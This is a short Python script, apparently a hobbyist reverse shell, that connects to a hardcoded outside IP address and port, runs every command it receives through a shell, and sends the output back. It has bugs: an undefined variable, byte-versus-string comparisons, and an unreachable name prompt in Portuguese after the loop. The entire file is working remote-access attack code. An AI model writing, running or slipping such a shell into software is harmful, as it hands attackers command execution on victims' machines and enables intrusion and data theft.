import socket
import subprocess
from os import listdir

host = '177.184.102.22'
port = 7777

s = socket.socket()

s.connect((host, port))

while True:
    cmd = s.recv(1024)

    if cmd == 'ls':
        listdir()
    
    elif cmd == 'pwd':
        conn.send(b'pwd')

    proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    resposta = proc.stdout.read() + proc.stderr.read()

    s.send(resposta)

nome = input('Digite seu nome: ')
